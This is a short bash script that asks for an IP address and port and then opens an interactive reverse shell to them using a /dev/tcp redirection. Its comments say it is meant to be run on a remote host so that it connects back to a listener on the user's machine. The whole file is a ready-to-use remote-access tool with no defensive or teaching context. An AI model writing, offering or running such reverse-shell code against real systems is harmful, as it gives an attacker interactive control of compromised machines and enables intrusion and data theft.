#!/bin/bash

#Running this script on the remote host after starting the listener on your 
# machine will tell the remote host what IP and port to try and connect back to.

#local machine IP
echo "Enter your IP"
read LHOST

#local machine listening port
echo "Enter the listening port"
read LPORT

echo "Press [Enter] to connect to local host"
read enter

bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
